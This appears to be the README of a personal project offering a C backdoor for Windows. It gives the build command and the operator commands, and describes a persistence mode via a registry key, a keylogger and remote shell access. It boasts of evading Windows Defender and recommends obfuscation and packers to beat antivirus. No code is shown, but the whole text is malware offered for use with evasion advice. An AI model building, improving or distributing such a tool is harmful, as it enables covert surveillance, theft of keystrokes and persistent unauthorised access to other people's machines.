# BACKDOOR-C

 Personal project of realization of an undectable C backdoor under windows defender (before passage under total virus)

# INSTALLATION

To use the backdoor :

`i686-w64-mingw32-gcc -o test.exe back.c -lwsock32 -lwininet`

Replace test.exe by the name you want to call your executable file and it's done !

# The project :

The backdoor is functional under Windows and includes a persistent mode, a keylogger and a shell access.

I also put a 2nd version who is the same backdoor but i obfuscate him.
if you using packer you may have a better resistance to A.V !

## Command to use it 

- cd : to move another directory when you gain access to your shell
- persist : to use the persist mode and create an HKEY_CURRENT_KEY
- keylog : ton activate the keylogger
